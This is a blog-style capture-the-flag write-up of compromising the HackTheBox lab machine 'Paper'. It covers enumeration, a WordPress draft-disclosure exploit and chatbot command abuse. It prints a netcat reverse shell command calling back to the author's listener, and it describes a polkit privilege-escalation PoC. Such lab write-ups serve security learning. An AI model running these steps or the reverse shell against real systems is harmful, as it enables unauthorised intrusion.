Paper

Posted on Mar 15, 2022

For this writeup, I will cover my experience on the HackTheBox machine Paper, a Linux system with a rating of Easy.

Enumeration

To begin, I run a quick nmap scan against the host to identify any services of interest.

kali@kali:~$ nmap 10.10.11.143             
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-15 23:16 EDT
Nmap scan report for office.paper (10.10.11.143)
Host is up (0.081s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 10.89 seconds

Immediately, we discover web servers are running on TCP 80 & 443. At this point, I choose to ignore the ssh server on port 22, since I don’t have credentials and it likely won’t be an avenue worth exploring.

When browsing over both HTTP and HTTPS, we are greeted by what I assume is a default page after installing and running apache. Knowing that this will not be useful for our purposes, I decide to enumerate further, and kick off a couple of gobuster scans, for enumerating potential subdomains, and directories and files. In this case, I ran both against the HTTP port.

Subdomains:

kali@kali:~$ gobuster dns -d 10.10.11.143 -w /usr/share/wordlists/dirb/big.txt

Directories and files:

kali@kali:~$ gobuster dir -u http://10.10.11.143 -w /usr/share/wordlists/dirb/big.txt

The subdomain scan did not return with anything, however, the the directory scan did return some items of interest.

/.htaccess            (Status: 403) [Size: 199]
/.htpasswd            (Status: 403) [Size: 199]
/cgi-bin/             (Status: 403) [Size: 199]
/manual               (Status: 301) [Size: 235] [--> http://10.10.11.143/manual/]

Specifically, the /cgi-bin/ path caught my eye. To further enumerate, I ran another gobuster scan, but this time, targeted at the /cgi-bin/ directory. While that ran, I inspected the /manual page. This appeared to also be stock documentation, and after some brief investigation, I determined it would not be of use.

kali@kali:~$ gobuster dir -u http://10.10.11.143/cgi-bin/ -w /usr/share/wordlists/dirb/big.txt

However, this scan would return nothing, and at this point, I was left without any leads, so I opted to run a couple more nmap scans.

The first scan used the -sV flag, which I used to identify the version of httpd that was running. This returned with version 2.4.37, which I quickly searched online for to see if there were any notable vulnerabilities with exploits. None of the vulnerabilities I found were of interest, and I moved on.

The second scan was this time targeted to the entirety of the TCP port range. To be honest, this took a while, and by the time it completed, I had already moved on.

While this ran, I revisited the webpage being served to see if there were any interesting HTTP headers being included in the server response. To do this, I opened Firefox’s develop tools, went to the Network menu, and then browsed the page. Over port 80, I did find an unexpected response header value, specifically, X-Backend-Server: office.paper. With this, I assumed that this might require us to have a corresponding Host: office.paper request header.

The easiest way to do this would be to add an office.paper entry to our /etc/hosts/ file.

kali@kali:~$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.10.11.143 office.paper

Once it has been added, I attempt to browse to the same page. Behold! We are met with a completely new website, built in WordPress. At this point, I am very confident we have found our target.

Getting the user flag

I begin exploring the website to see if we can find anything that points us in the right direction, and was able to find three posts. None of the posts had anything of interest, however, there was a comment that suggested that it was possible to read the user’s drafts, which is obviously not how drafts typically work, and I suspected this may be hinting at a potential vulnerability to exploit.

Thus, I quickly searched Google for WordPress vulnerabilities impacting v5.2.3, which I knew was the version via the Wappalyzer Firefox extension.

The first link I clicked on was to WPScan, and fortunately for us, WPScan does a really great job of documenting vulnerabilities to WordPress. I immediately scrolled from the top to the bottom of the list just to understand the length of the list, and coincedentally, at the very bottom of the list was the vulnerability WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts.

From there, I found the included URL to a PoC exploit for the vulnerability, and skimmed through the PoC. Recreating the PoC is incredibly simple, and ultimately all we had to do was request the URL of http://office.paper/?static=1. After doing that, we had access to the user’s drafts.

Most of the drafts were not relevant, however, there was a breadcrumb:

# Secret Registration URL of new Employee chat system

http://chat.office.paper/register/8qozr226AhkCHZdyY

After attempting to browse that site, we are met with a Server Not Found error. I assumed this was another case of needing to provide the Host value in the request header, so added another entry to our /etc/hosts/ file, this time resolving chat.office.paper to the machine’s IP address.

This was successful! We were then able to browse to the provided registration URL and register an account to the rocket.chat service.

Upon logging in, you are presented with a pretty standard chat tool interface. I have never used rocket.chat before, but it is very similar to Slack. After playing around in the interface, I was able to find a public channel labeled #general, so I joined it and read some of the pre-existing conversation between the “company” employees.

In this conversation, they mention a bot programmed by one of the employees (Dwight) that is able to parse commands from the chat. There are five documented commands the bot supports; two of which are goofy functions that I ignored; one of which provides the time; and the remaining two allow a user to list and download files. I would start a DM directly with the bot, named ‘recyclops’, to start testing these functions.

The list command allows you to specify a path, and from there, returns output similar to what you’d expect from running ls -l. I started exploring this command to understand both what is on the filesystem, and how we may be able to abuse the command.

I was able to view the contents of the dwight user’s home directory. In this directory, we can see one of our targets, the user.txt flag.

However, I was not able to escape out of the bot to run my own commands.

Given that the list command was able to access files outside of the sales directory, I thought I would attempt to get the user flag using the file command.

However, any attempts to access files outside of the sales directory did not work, and are returned with Access denied. messages. Similarly, any attempt to escape out of the command is met with the same Stop injecting OS commands! message.

After some additional exploring using the combination of these two commands, I noticed the hubot directory in the user’s home directory. With further exploration, we discover a hubot/scripts directory. At first glance, the directory seems to store all of the various custom scripts the recyclops bot is configured use.

Most of these are expected and map to the features described by the bot’s help message. However, the run.js file, or any other generic run feature, was not described by the bot’s help message. With this knowledge, I attempted to test for a run command.

Getting the root flag

With the ability to run commands via the chatbot, my first goal was to see if we could get a full shell environment via netcat. Fortunately, a nc binary already existed on the lab system in /usr/bin/.

On my system:

nc -nvlp 4444

On the lab system, via chatbot:

run nc 10.10.14.13 4444 -e /bin/bash

The reverse shell successfully connected, and I confirm by sending over a test id command, which returns the expected result. From here I decide to upgrade the simple reverse shell to an interactive tty using the Python pty method (see additional details here.

First, I check for the existence of python on the system.

$ which python python2 python3
/usr/bin/python3

Because we were able to find python3, I issue the following command:

python3 -c 'import pty; pty.spawn("/bin/bash")'

With this fully interactive shell, my next focus is on finding avenues for privilege escalation. To do this, I download and run linPEAS onto the system. At first, I attempted to curl the linpeas.sh script directly from github on the lab system, however, it was not able to resolve github.com. To get around this, I quickly setup a simple webserver on my system using python to serve the linPEAS script, and then used curl to download the file onto the lab system. Once downloaded, I made the script executable using chmod, and then ran the script to output to a file.

./linpeas.sh -a > linpeas.txt

Once completed, I thoroughly go through the output of the linPEAS script. The linPEAS script includes a lot of information, much of which may not be useful for us. To begin with, I focus on the “RED/YELLOW” items, which are considered “95% a PE vector” according to the legend at the top.

The first item RED/YELLOW item from the top is the vulnerability to CVE-2021-3560. To begin, I search Google for a CVE-2021-3560 exploit. Conveniently, the first link returned by Google is a PoC exploit. More interestingly, it appears to be authored by the same person who put together this lab machine. Given this, I am 99.9% confident that this is the exploit we will want to use to escalate privileges.

I download and slightly modify the poc.sh file from this PoC, just to use a non-default username and password to ensure I don’t step on any other users of the lab systems' toes. I then download the file to the lab system similar to how I did for linPEAS, and run then run the poc.sh script.

The script provides a bunch of useful output that describes what it’s doing.

As described in the output, because it is a timing-based attack, this may require multiple attempts. In my case, after 4 rounds of running the script and attempting to switch to my injected user, I was able to successfully switch. After that, I was able to escalate privileges to root using sudo bash.

Finally, I was able to get ahold of the root flag!

[root@paper sbenson]# cat /root/root.txt
713f4b9fcbb40438a8ffb89c70ae59de

Review

Overall, I thought this was a fun lab machine that was rightly rated as Easy. Most of what is needed to exploit the system is in relatively-plain view, and the box never goes out of its way to confuse you.

For me, finding the initial foothold was the most challenging part, but once I found the foothold, everything else went relatively smoothly.
